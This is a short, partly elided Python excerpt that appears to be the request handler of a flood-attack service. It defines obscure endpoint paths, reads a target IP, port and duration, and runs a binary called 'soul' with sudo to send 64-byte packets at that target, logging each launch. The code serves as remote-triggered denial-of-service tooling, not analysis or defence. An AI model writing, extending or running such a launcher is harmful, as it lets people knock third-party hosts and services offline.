...
SOUL_PATH = '/rikitxyzmadebtsoulcrack/'
DONE_PATH = '/rikitxyzmadebtsoulcrack/done'
    ...
    if ip and port and time_val:
        ...
        if key not in active_tasks:
            ...
            try:
                ...
                process = subprocess.Popen(['sudo', './soul', ip, str(port), str(time_val), '--packet-size', '64'])
                print(f"[+] Launched binary: sudo ./soul {ip} {port} {time_val} --packet-size 64 (PID: {process.pid})")
